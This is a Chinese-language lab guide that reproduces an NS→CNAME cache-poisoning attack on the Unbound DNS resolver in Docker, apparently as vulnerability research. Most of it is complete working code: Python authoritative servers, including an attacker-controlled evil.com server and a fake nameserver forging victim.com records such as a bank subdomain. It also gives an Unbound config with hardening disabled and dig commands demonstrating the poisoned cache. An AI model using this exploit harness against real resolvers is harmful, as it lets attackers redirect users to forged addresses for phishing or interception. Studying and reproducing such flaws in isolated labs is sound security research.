# NS→CNAME Cache Poisoning — Docker 手动搭建完整指南

## 前提条件

- Windows 主机安装了 Docker Desktop
- 项目目录 `d:/doctor/方班汇报/ProtocolGuard` 包含 Unbound 源码
- PowerShell 终端

---

## 第一步：构建 Docker 镜像

在 PowerShell 中执行：

```powershell
cd "d:\doctor\方班汇报\ProtocolGuard"
docker build -t protocolguard:llvm14 .
```

> 如果已有该镜像，可跳过。构建约需 5-10 分钟。

---

## 第二步：启动容器

```powershell
docker run -d --name unbound-poc --cap-add=NET_ADMIN -v "d:/doctor/方班汇报/ProtocolGuard:/workspace" protocolguard:llvm14 sleep infinity
```

- `--cap-add=NET_ADMIN`：允许添加 loopback 地址（127.0.0.2、127.0.0.3）
- `-v ...:/workspace`：将项目挂载到容器内

验证容器运行：

```powershell
docker ps | findstr unbound-poc
```

---

## 第三步：进入容器

```powershell
docker exec -it unbound-poc bash
```

此后所有命令都在容器内执行（`root@xxxxx:/workspace#`）。

---

## 第四步：安装依赖

```bash
apt-get update -qq
apt-get install -y dnsutils python3 iproute2
```

- `dnsutils`：提供 `dig` 命令
- `python3`：运行权威 DNS 服务器脚本
- `iproute2`：提供 `ip` 命令配置网络

---

## 第五步：配置网络

```bash
ip addr add 127.0.0.2/8 dev lo 2>/dev/null || true
ip addr add 127.0.0.3/8 dev lo 2>/dev/null || true
```

这为三个权威服务器创建额外的 loopback 地址。验证：

```bash
ip addr show lo | grep "inet 127"
```

应看到 `127.0.0.1/8`、`127.0.0.2/8`、`127.0.0.3/8`。

---

## 第六步：编译 Unbound

```bash
cd /workspace/output/unbound-source
chmod +x configure install-sh config.guess config.sub missing compile depcomp ltmain.sh 2>/dev/null || true

./configure CC=clang-14 CFLAGS="-g -O2 -Wno-error=deprecated-declarations -Wno-error=unused-but-set-variable"

make -j$(nproc)
cp unbound /workspace/output/unbound-binary-baseline
```

验证：

```bash
/workspace/output/unbound-binary-baseline -h | head -1
```

应显示 Unbound 版本号。

---

## 第七步：创建工作目录

```bash
mkdir -p /workspace/output/unbound-cache-poison
cd /workspace/output/unbound-cache-poison
```

---

## 第八步：部署 Auth 服务器（127.0.0.2:53）

创建 `auth.py`：

```bash
cat > auth.py << 'PYEOF'
#!/usr/bin/env python3
"""权威 DNS 服务器 — Root + com + victim.com + safe.com"""
import socket, struct, json, sys

LOG = "/workspace/output/unbound-cache-poison/auth.jsonl"

def enc(n):
    """域名编码: www.example.com -> \\x03www\\x07example\\x03com\\x00"""
    if not n or n == '.': return b'\x00'
    r = b''
    for l in n.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode()
    return r + b'\x00'

def rr(name, rtype, rclass, ttl, rdata):
    """构造一条 DNS 资源记录"""
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def log_query(qname, qtype, from_addr, response_type):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'q': qname, 't': qtype, 'f': from_addr, 'r': response_type}) + '\n')
    print(f"[AUTH] {from_addr}: {qname} {qtype} → {response_type}", flush=True)

def parse_query(data):
    """解析 DNS 查询包，返回 (qname, qtype, qclass)"""
    if len(data) < 12: return None, None, None
    txid, flags, qdcount = struct.unpack('!HHH', data[:6])
    if flags >> 15: return None, None, None  # 不是查询
    off = 12
    labels = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off + 1 + ll > len(data): break
        if ll > 63: off += 2; break  # 压缩指针
        labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
        off += 1 + ll
    else:
        off += 1  # 跳过 null 终止符
    qname = '.'.join(labels)
    if off + 4 > len(data): return qname, None, None
    qtype, qclass = struct.unpack('!HH', data[off:off+4])
    return qname, qtype, qclass

# SOA 记录数据
SOA_VICTIM = (enc('ns.victim.com.') + enc('admin.victim.com.') +
              struct.pack('!IIIII', 2026100901, 3600, 900, 604800, 86400))
SOA_SAFE = (enc('ns.safe.com.') + enc('admin.safe.com.') +
            struct.pack('!IIIII', 2026100902, 3600, 900, 604800, 86400))

QTYPE_MAP = {1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA', 28: 'AAAA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.2', 53))
print("[AUTH] 监听 127.0.0.2:53 — Root + com + victim.com + safe.com", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        qname, qtype, qclass = parse_query(data)
        if qname is None: continue
        qtype_name = QTYPE_MAP.get(qtype, f'T{qtype}')
        qnl = qname.lower().rstrip('.')
        txid = struct.unpack('!H', data[:2])[0]

        # ── Root 区域 ──
        if qnl == '' and qtype == 2:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 1)
            r += enc('.') + struct.pack('!HH', 2, qclass)
            r += rr('.', 2, qclass, 300, enc('ns1.'))
            r += rr('ns1.', 1, qclass, 300, struct.pack('!I', 0x7f000002))
            log_query(qname, qtype_name, addr[0], 'ROOT_NS')
            sock.sendto(r, addr); continue

        if qnl == 'ns1' and qtype == 1:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('ns1.') + struct.pack('!HH', 1, qclass)
            r += rr('ns1.', 1, qclass, 300, struct.pack('!I', 0x7f000002))
            log_query(qname, qtype_name, addr[0], 'ROOT_A')
            sock.sendto(r, addr); continue

        # ── com 区域 ──
        if qnl == 'com' and qtype in (2, 6):
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 1 if qtype == 2 else 0)
            r += enc('com.') + struct.pack('!HH', qtype, qclass)
            if qtype == 2:
                r += rr('com.', 2, qclass, 300, enc('ns1.com.'))
                r += rr('ns1.com.', 1, qclass, 300, struct.pack('!I', 0x7f000002))
            else:
                soa = (enc('ns1.com.') + enc('admin.com.') +
                       struct.pack('!IIIII', 2026100904, 3600, 900, 604800, 86400))
                r += rr('com.', 6, qclass, 300, soa)
            log_query(qname, qtype_name, addr[0], 'COM')
            sock.sendto(r, addr); continue

        if qnl == 'ns1.com' and qtype == 1:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('ns1.com.') + struct.pack('!HH', 1, qclass)
            r += rr('ns1.com.', 1, qclass, 300, struct.pack('!I', 0x7f000002))
            log_query(qname, qtype_name, addr[0], 'COM_A')
            sock.sendto(r, addr); continue

        # ── com → evil.com 委派 ──
        if qnl == 'evil.com' or qnl.endswith('.evil.com'):
            r = struct.pack('!HHHHHH', txid, 0x8000, 1, 0, 1, 1)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            r += rr('evil.com.', 2, qclass, 300, enc('ns.evil.com.'))
            r += rr('ns.evil.com.', 1, qclass, 300, struct.pack('!I', 0x7f000003))
            log_query(qname, qtype_name, addr[0], 'REF→evil')
            sock.sendto(r, addr); continue

        # ── com → safe.com 委派 ──
        if qnl == 'safe.com' or qnl.endswith('.safe.com'):
            r = struct.pack('!HHHHHH', txid, 0x8000, 1, 0, 1, 1)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            r += rr('safe.com.', 2, qclass, 300, enc('ns.safe.com.'))
            r += rr('ns.safe.com.', 1, qclass, 300, struct.pack('!I', 0x7f000002))
            log_query(qname, qtype_name, addr[0], 'REF→safe')
            sock.sendto(r, addr); continue

        # ★★★ 关键：ns.victim.com 返回 CNAME 答案 ★★★
        # 这是攻击的核心：NS 记录指向 CNAME，Unbound 会跟踪 CNAME 跨域解析
        if qnl == 'ns.victim.com' and qtype in (1, 5):
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('ns.victim.com.') + struct.pack('!HH', qtype, qclass)
            r += rr('ns.victim.com.', 5, qclass, 300, enc('resolve.evil.com.'))
            log_query(qname, qtype_name, addr[0], '★CNAME_ANSWER')
            sock.sendto(r, addr); continue

        # ── victim.com 区域：NS, SOA ──
        if qnl == 'victim.com' and qtype in (2, 6):
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('victim.com.') + struct.pack('!HH', qtype, qclass)
            if qtype == 2:
                r += rr('victim.com.', 2, qclass, 300, enc('ns.victim.com.'))
            else:
                r += rr('victim.com.', 6, qclass, 300, SOA_VICTIM)
            log_query(qname, qtype_name, addr[0], 'VICTIM_ZONE')
            sock.sendto(r, addr); continue

        # ── victim.com 子域：返回 NODATA（迫使 Unbound 使用 CNAME 解析的 NS 地址）──
        if qnl.endswith('.victim.com'):
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 0, 1, 0)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            r += rr('victim.com.', 6, qclass, 300, SOA_VICTIM)
            log_query(qname, qtype_name, addr[0], 'NODATA')
            sock.sendto(r, addr); continue

        # ── safe.com 区域 ──
        if qnl == 'safe.com' and qtype in (2, 6):
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('safe.com.') + struct.pack('!HH', qtype, qclass)
            if qtype == 2:
                r += rr('safe.com.', 2, qclass, 300, enc('ns.safe.com.'))
            else:
                r += rr('safe.com.', 6, qclass, 300, SOA_SAFE)
            log_query(qname, qtype_name, addr[0], 'SAFE_ZONE')
            sock.sendto(r, addr); continue

        if qnl == 'ns.safe.com' and qtype == 1:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('ns.safe.com.') + struct.pack('!HH', 1, qclass)
            r += rr('ns.safe.com.', 1, qclass, 300, struct.pack('!I', 0x7f000002))
            log_query(qname, qtype_name, addr[0], 'SAFE_A')
            sock.sendto(r, addr); continue

        if qnl == 'www.safe.com' and qtype == 1:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            r += enc('www.safe.com.') + struct.pack('!HH', 1, qclass)
            r += rr('www.safe.com.', 1, qclass, 300, struct.pack('!I', 0x05050505))
            log_query(qname, qtype_name, addr[0], 'SAFE_WWW')
            sock.sendto(r, addr); continue

        # ── com → victim.com 委派（含 CNAME glue）──
        if qnl == 'victim.com' or qnl.endswith('.victim.com'):
            r = struct.pack('!HHHHHH', txid, 0x8000, 1, 0, 1, 1)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            r += rr('victim.com.', 2, qclass, 300, enc('ns.victim.com.'))
            r += rr('ns.victim.com.', 5, qclass, 300, enc('resolve.evil.com.'))
            log_query(qname, qtype_name, addr[0], 'REF→victim')
            sock.sendto(r, addr); continue

        # ── 其他：NXDOMAIN ──
        r = struct.pack('!HHHHHH', txid, 0x8003, 1, 0, 0, 0)
        r += enc(qname) + struct.pack('!HH', qtype, qclass)
        log_query(qname, qtype_name, addr[0], 'NXDOMAIN')
        sock.sendto(r, addr)

    except Exception as e:
        print(f"[AUTH] Error: {e}", file=sys.stderr)
PYEOF
```

---

## 第九步：部署 Evil.com 服务器（127.0.0.3:53）

创建 `evil.py`：

```bash
cat > evil.py << 'PYEOF'
#!/usr/bin/env python3
"""攻击者控制的 evil.com 权威服务器"""
import socket, struct, json, sys

LOG = "/workspace/output/unbound-cache-poison/evil.jsonl"

def enc(n):
    if not n or n == '.': return b'\x00'
    r = b''
    for l in n.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode()
    return r + b'\x00'

def rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def parse_query(data):
    if len(data) < 12: return None, None, None
    txid, flags, qdcount = struct.unpack('!HHH', data[:6])
    if flags >> 15: return None, None, None
    off = 12; labels = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off + 1 + ll > len(data): break
        if ll > 63: off += 2; break
        labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
        off += 1 + ll
    else: off += 1
    qname = '.'.join(labels)
    if off + 4 > len(data): return qname, None, None
    qtype, qclass = struct.unpack('!HH', data[off:off+4])
    return qname, qtype, qclass

# ★ 关键：resolve.evil.com A 127.0.0.1 — 指向 Fake NS
RECORDS = {
    ('evil.com', 2): [(300, enc('ns.evil.com.'))],
    ('evil.com', 6): [(300, enc('ns.evil.com.') + enc('admin.evil.com.') +
                       struct.pack('!IIIII', 2026100903, 3600, 900, 604800, 86400))],
    ('ns.evil.com', 1): [(300, struct.pack('!I', 0x7f000003))],
    ('resolve.evil.com', 1): [(300, struct.pack('!I', 0x7f000001))],  # ★ 127.0.0.1
}

QTYPE_MAP = {1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.3', 53))
print("[EVIL] 监听 127.0.0.3:53 — 攻击者控制的 evil.com", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        qname, qtype, qclass = parse_query(data)
        if qname is None: continue
        qtype_name = QTYPE_MAP.get(qtype, f'T{qtype}')
        txid = struct.unpack('!H', data[:2])[0]
        qnl = qname.lower().rstrip('.')

        with open(LOG, 'a') as f:
            f.write(json.dumps({'q': qname, 't': qtype_name, 'f': addr[0]}) + '\n')
        print(f"[EVIL] {addr[0]}: {qname} {qtype_name}", flush=True)

        answers = []
        if (qnl, qtype) in RECORDS:
            for ttl, rd in RECORDS[(qnl, qtype)]:
                answers.append((qname, qtype, ttl, rd))

        if answers:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, len(answers), 0, 0)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            for n, t, ttl, rd in answers:
                r += rr(n, t, qclass, ttl, rd)
            sock.sendto(r, addr)
        else:
            soa = enc('ns.evil.com.') + enc('admin.evil.com.') + struct.pack('!IIIII', 2026100903, 3600, 900, 604800, 86400)
            r = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 1, 0)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            r += rr('evil.com.', 6, qclass, 300, soa)
            sock.sendto(r, addr)
    except: pass
PYEOF
```

---

## 第十步：部署 Fake NS 服务器（127.0.0.1:53）

创建 `fake.py`：

```bash
cat > fake.py << 'PYEOF'
#!/usr/bin/env python3
"""伪造的 victim.com 权威服务器 — 返回被篡改的 DNS 记录"""
import socket, struct, json, sys, time

LOG = "/workspace/output/unbound-cache-poison/fake.jsonl"

def enc(n):
    if not n or n == '.': return b'\x00'
    r = b''
    for l in n.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode()
    return r + b'\x00'

def rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def parse_query(data):
    if len(data) < 12: return None, None, None
    txid, flags, qdcount = struct.unpack('!HHH', data[:6])
    if flags >> 15: return None, None, None
    off = 12; labels = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off + 1 + ll > len(data): break
        if ll > 63: off += 2; break
        labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
        off += 1 + ll
    else: off += 1
    qname = '.'.join(labels)
    if off + 4 > len(data): return qname, None, None
    qtype, qclass = struct.unpack('!HH', data[off:off+4])
    return qname, qtype, qclass

SOA = enc('ns.victim.com.') + enc('admin.victim.com.') + struct.pack('!IIIII', 999, 3600, 900, 604800, 86400)

# ★ 伪造的 DNS 记录
FORGED = {
    ('victim.com', 2): [(300, enc('ns.victim.com.'))],
    ('victim.com', 6): [(300, SOA)],
    ('ns.victim.com', 1): [(300, struct.pack('!I', 0x7f000001))],
    ('www.victim.com', 1): [(300, struct.pack('!I', 0x06060606))],   # ★ 伪造 6.6.6.6
    ('mail.victim.com', 1): [(300, struct.pack('!I', 0x06060607))],   # ★ 伪造 6.6.6.7
    ('bank.victim.com', 1): [(300, struct.pack('!I', 0x06060608))],   # ★ 伪造 6.6.6.8
}

QTYPE_MAP = {1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.1', 53))
print("[FAKE] 监听 127.0.0.1:53 — 伪造 www.victim.com → 6.6.6.6 (合法应为 1.2.3.4)", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        qname, qtype, qclass = parse_query(data)
        if qname is None: continue
        qtype_name = QTYPE_MAP.get(qtype, f'T{qtype}')
        txid = struct.unpack('!H', data[:2])[0]

        with open(LOG, 'a') as f:
            f.write(json.dumps({'ts': time.monotonic(), 'q': qname, 't': qtype_name, 'f': addr[0]}) + '\n')
        print(f"[FAKE] {addr[0]}: {qname} {qtype_name}  ← 攻击者收到查询!", flush=True)

        qnl = qname.lower().rstrip('.')
        answers = []
        if (qnl, qtype) in FORGED:
            for ttl, rd in FORGED[(qnl, qtype)]:
                answers.append((qname, qtype, ttl, rd))

        if answers:
            r = struct.pack('!HHHHHH', txid, 0x8400, 1, len(answers), 0, 0)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            for n, t, ttl, rd in answers:
                r += rr(n, t, qclass, ttl, rd)
            sock.sendto(r, addr)
        else:
            r = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 1, 0)
            r += enc(qname) + struct.pack('!HH', qtype, qclass)
            r += rr('victim.com.', 6, qclass, 300, SOA)
            sock.sendto(r, addr)
    except: pass
PYEOF
```

---

## 第十一步：启动所有服务器

```bash
# 清空旧日志
> auth.jsonl; > evil.jsonl; > fake.jsonl

# 启动三个服务器（后台运行）
python3 auth.py > auth.log 2>&1 &
python3 evil.py > evil.log 2>&1 &
python3 fake.py > fake.log 2>&1 &

# 等待服务器启动
sleep 1

# 验证所有服务器运行
echo "=== 服务器状态 ==="
ss -ulnp | grep ":53 "
```

应看到三个进程分别绑定 127.0.0.1:53、127.0.0.2:53、127.0.0.3:53。

---

## 第十二步：配置并启动 Unbound

### 创建 root hints

```bash
cat > hint << 'EOF'
. IN NS ns1.
ns1. IN A 127.0.0.2
EOF
```

### 创建 Unbound 配置

```bash
cat > ub.conf << 'CONF'
server:
    directory: "/workspace/output/unbound-cache-poison"
    pidfile: "/workspace/output/unbound-cache-poison/unbound.pid"
    port: 5353
    interface: 127.0.0.1@5353
    do-ip6: no
    access-control: 127.0.0.0/8 allow
    username: ""
    chroot: ""
    do-daemonize: no
    use-syslog: no
    logfile: "/workspace/output/unbound-cache-poison/unbound.log"
    verbosity: 3
    log-queries: yes
    log-replies: yes
    do-not-query-localhost: no
    root-hints: "/workspace/output/unbound-cache-poison/hint"
    domain-insecure: "."
    domain-insecure: "com"
    domain-insecure: "victim.com"
    domain-insecure: "evil.com"
    domain-insecure: "safe.com"
    harden-glue: no
    harden-dnssec-stripped: no
    val-permissive-mode: yes
    prefetch: no

remote-control:
    control-enable: no
CONF
```

### 启动 Unbound

```bash
/workspace/output/unbound-binary-baseline -c ub.conf -d > ub_stdout.log 2>&1 &
sleep 3

# 验证 Unbound 运行
if kill -0 $! 2>/dev/null; then
    echo "✓ Unbound 启动成功"
else
    echo "✗ Unbound 启动失败，查看日志："
    cat unbound.log | head -20
    exit 1
fi
```

---

## 第十三步：执行攻击演示

### 证据 A — Unbound 跟踪 NS→CNAME 跨域解析

```bash
echo ""
echo "════════════════════════════════════════════════════════════"
echo "  证据 A: Unbound 跟踪 NS→CNAME 跨域解析"
echo "  查询: ns.victim.com A"
echo "  预期: CNAME → resolve.evil.com → A 127.0.0.1 (来自攻击者区域)"
echo "════════════════════════════════════════════════════════════"
dig @127.0.0.1 -p 5353 ns.victim.com A +time=10 +noall +answer
```

**预期输出**：
```
ns.victim.com.     300  IN  CNAME  resolve.evil.com.
resolve.evil.com.  300  IN  A      127.0.0.1
```

### 证据 B — Unbound 向 Fake NS 发送查询

```bash
echo ""
echo "════════════════════════════════════════════════════════════"
echo "  证据 B: Unbound 向 Fake NS 发送查询"
echo "  查询: www.victim.com A"
echo "  Fake NS (127.0.0.1:53) 应收到该查询"
echo "════════════════════════════════════════════════════════════"

# 重置 Fake NS 日志
> fake.jsonl

dig @127.0.0.1 -p 5353 www.victim.com A +time=15 +tries=1
sleep 1

# 检查 Fake NS 是否收到查询
echo ""
echo "  Fake NS 收到的查询："
cat fake.jsonl | python3 -c "
import sys, json
for l in sys.stdin:
    if l.strip():
        q = json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8}  from={q[\"f\"]}')" 2>/dev/null || echo "    (无查询)"
```

**预期输出**：
```
    www.victim.com               A         from=127.0.0.1
```

### 证据 C — 伪造数据被缓存并返回客户端

```bash
echo ""
echo "════════════════════════════════════════════════════════════"
echo "  证据 C: 伪造数据被缓存并返回客户端"
echo "  重复查询: www.victim.com A"
echo "  预期: 返回 6.6.6.6 (伪造) 而非 1.2.3.4 (合法)"
echo "════════════════════════════════════════════════════════════"
dig @127.0.0.1 -p 5353 www.victim.com A +time=10 +noall +answer
```

**预期输出**：
```
www.victim.com.    300  IN  A  6.6.6.6
```

### 对照组 — safe.com 不受攻击

```bash
echo ""
echo "════════════════════════════════════════════════════════════"
echo "  对照组: safe.com (NS→A, 无 CNAME, 不受攻击)"
echo "════════════════════════════════════════════════════════════"
dig @127.0.0.1 -p 5353 www.safe.com A +time=10 +noall +answer
```

**预期输出**：
```
www.safe.com.      300  IN  A  5.5.5.5
```

---

## 第十四步：查看完整解析日志

```bash
echo ""
echo "════════════════════════════════════════════════════════════"
echo "  完整解析日志"
echo "════════════════════════════════════════════════════════════"

echo ""
echo "  Auth 服务器 (127.0.0.2) 收到的查询："
cat auth.jsonl | python3 -c "
import sys, json
for l in sys.stdin:
    if l.strip():
        q = json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8} → {q[\"r\"]}')"

echo ""
echo "  Evil 服务器 (127.0.0.3) 收到的查询："
cat evil.jsonl | python3 -c "
import sys, json
for l in sys.stdin:
    if l.strip():
        q = json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8}')"

echo ""
echo "  Unbound CNAME/解析日志："
grep -iE "cname|victim|evil|resolve|ns\.victim|chase|target" unbound.log | head -40

echo ""
echo "  Unbound 错误日志："
grep -iE "servfail|out of.*target|fail|error" unbound.log | head -10
```

---

## 第十五步：清理

```bash
# 停止所有服务
pkill -f python3 2>/dev/null || true
pkill -f "unbound.*5353" 2>/dev/null || true
echo "✓ 所有服务已停止"
```

---

## 架构总结

```
┌─────────────────────────────────────────────────────────────┐
│                    Docker 容器 (unbound-poc)                 │
│                                                             │
│  127.0.0.2:53 ─── Auth 服务器                               │
│    ├── Root zone (ns1. → 127.0.0.2)                        │
│    ├── com zone                                             │
│    ├── victim.com 委派: NS=ns.victim.com, CNAME=resolve.evil.com ★│
│    └── safe.com 委派: NS=ns.safe.com, A=127.0.0.2          │
│                                                             │
│  127.0.0.3:53 ─── Evil 服务器 (攻击者控制)                   │
│    └── evil.com zone                                        │
│        └── resolve.evil.com A 127.0.0.1 ★                  │
│                                                             │
│  127.0.0.1:53 ─── Fake NS (攻击者伪装)                       │
│    └── 伪造 victim.com 数据                                 │
│        └── www.victim.com A 6.6.6.6 ★                      │
│                                                             │
│  127.0.0.1:5353 ─ Unbound 递归解析器                        │
│                                                             │
│  ── 攻击链 ──                                               │
│  ① dig → Unbound 查询 victim.com NS                        │
│  ② com 委派返回 NS=ns.victim.com, CNAME=resolve.evil.com  │
│  ③ Unbound 跟踪 CNAME → evil.com 区域                      │
│  ④ evil.com 返回 resolve.evil.com A 127.0.0.1             │
│  ⑤ Unbound 将 127.0.0.1 视为 victim.com 的 NS ★          │
│  ⑥ Unbound 向 127.0.0.1 (Fake NS) 发送查询                │
│  ⑦ Fake NS 返回 www.victim.com A 6.6.6.6 (伪造)           │
│  ⑧ 客户端收到 6.6.6.6 而非合法 IP                          │
└─────────────────────────────────────────────────────────────┘
```
